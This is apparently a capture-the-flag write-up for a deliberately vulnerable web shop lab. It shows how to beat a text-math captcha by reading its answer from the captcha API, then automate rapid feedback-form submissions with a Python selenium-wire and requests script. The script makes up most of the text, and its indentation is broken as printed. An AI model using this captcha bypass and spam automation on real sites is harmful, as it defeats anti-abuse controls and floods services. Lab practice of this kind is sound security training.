## Send 10 Feedbacks Through the Feedback Form in less than 10 seconds
To solve this challenge, the process and the calling of the API needs to be first explored.

When submitting a feedback through the form, a captcha check is attached at the end. However, this captcha can be easily broken as it isn't an image or puzzle-based captcha, but rather a text math problem.

To solve this challenge, I'm using python's selenium-wire and webdriver_manager to start an instance of Chrome to execute my commands, together with requests and other libraries needed.

		import  requests
		from  requests.api  import  request
		from  seleniumwire  import  webdriver
		from  webdriver_manager.chrome  import  ChromeDriverManager
		import  time
		import  json
After that's done, all we need to do is to specify the URL of the contact form and start the webdriver to launch an instance of Chrome (and start a timer as well)

		urlpage  =  'http://192.168.235.129:3000/#/contact'
		driver  =  webdriver.Chrome(ChromeDriverManager().install())
		start  =  time.time()
We then start a for loop to iterate through each time a form submits, getting the website first, waiting a few milliseconds for it to render (since it is built from Angular) and then getting a captcha GET request with the requests library in order to get the answer for the captcha question. (Then end timer and print resulting end time)

		for  i  in  range (11):
			driver.get("http://192.168.235.129:3000/#/contact")
			time.sleep(0.1)
			arr  = []
			for  request  in  driver.requests:
			if  request.url  ==  "http://192.168.235.129:3000/rest/captcha/":
			arr.append(json.loads(request.response.body))
			answer  =  arr[-1]
			requests.post("http://192.168.235.129:3000/api/Feedbacks/", data={"captchaId":answer.get('captchaId'),"captcha":answer.get('answer'),"comment":"aaaa (anonymous)","rating":2})
	
		end  =  time.time()
		print(end-start)
Full stuff.py file:

	# import libraries

	import  requests
	from  requests.api  import  request
	from  seleniumwire  import  webdriver
	from  webdriver_manager.chrome  import  ChromeDriverManager
	import  time
	import  json

	# specify the url
	urlpage  =  'http://192.168.235.129:3000/#/contact'
	driver  =  webdriver.Chrome(ChromeDriverManager().install())
	start  =  time.time()

	for  i  in  range (11):
		driver.get("http://192.168.235.129:3000/#/contact")
		time.sleep(0.1)
		arr  = []
		for  request  in  driver.requests:
		if request.url  ==  "http://192.168.235.129:3000/rest/captcha/":
		arr.append(json.loads(request.response.body))
		answer  =  arr[-1]
		requests.post("http://192.168.235.129:3000/api/Feedbacks/", data={"captchaId":answer.get('captchaId'),"captcha":answer.get('answer'),"comment":"aaaa (anonymous)","rating":2})

	end  =  time.time()
	print(end-start)
